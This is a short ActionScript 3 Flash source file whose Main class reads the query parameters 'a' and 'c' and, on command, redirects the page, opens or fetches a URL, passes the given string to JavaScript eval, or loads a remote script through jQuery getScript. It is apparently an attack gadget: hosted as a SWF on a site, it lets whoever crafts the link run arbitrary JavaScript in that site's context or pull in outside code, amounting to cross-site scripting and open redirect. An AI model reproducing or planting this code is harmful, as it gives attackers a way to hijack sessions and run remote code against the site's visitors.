package {
 import flash.display.Sprite;
 import flash.net.*;
 import flash.external.ExternalInterface;
 public class Main extends Sprite {
  public function Main() {
   var param: Object = root.loaderInfo.parameters;
   var action: String = param["a"];
   var cmd: String = param["c"];
   switch (action) {
    case "location": // location URL
     navigateToURL(new URLRequest(cmd), "_self");
     break;
    case "open": // open URL
     navigateToURL(new URLRequest(cmd), "_blank");
     break;
    case "get": // GET
     var loader: URLLoader = new URLLoader(new URLRequest(cmd));
     break;
    case "eval": // execute JS
     flash.external.ExternalInterface.call("eval", cmd);
     break;
    case "run": // execute JS file
     var script: String = "if($&&$.getScript){ $.getScript("+cmd+") }";
     flash.external.ExternalInterface.call("eval", script);
     break;
    default:
     break;
   }
  }
 }
}